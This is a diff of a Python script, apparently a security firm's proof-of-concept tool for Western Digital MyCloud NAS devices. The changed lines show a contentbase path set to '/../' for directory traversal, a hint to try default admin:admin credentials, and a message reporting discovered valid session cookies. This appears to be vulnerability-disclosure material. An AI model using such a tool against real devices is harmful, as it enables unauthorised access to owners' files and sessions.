@@ -1,8 +1,16 @@
-import urllib3
-import sys
-import socket
-import requests
-from colorama import init, Fore
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+'''
+author: @mezdanak, modzero AG, https://www.modzero.ch, @mod0
+'''
+try:
+	import urllib3
+	import sys
+	import socket
+	import requests
+	from colorama import init, Fore
+except:
+	print "Missing dependencies. Run 'sudo pip install -r requirements.txt'"
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -42,7 +50,7 @@ def setContentBase(host, port):
                 print (Fore.YELLOW + "*** You should try to login with admin:admin (default creds) ***")
                 sys.exit()
         else:
-                print (Fore.MAGENTA + "*** 'contentbase' path set to '/'' ***")
+                print (Fore.MAGENTA + "*** 'contentbase' path set to '/../' ***")
                 return True
 
 def serverInfo(host, port):
@@ -139,7 +147,7 @@ def browser(host, port, version):
                                                 else:
                                                         print line
                         if len(validCookieString) >= 1:
-                                print (Fore.RED + "Valid WDMyCloud cookie discovered: {0}".format(validCookieString))
+                                print (Fore.RED + "Valid WD cookie discovered: {0}".format(validCookieString))
                         print "-" * 30
                 elif var == "exit":
                         sys.exit()
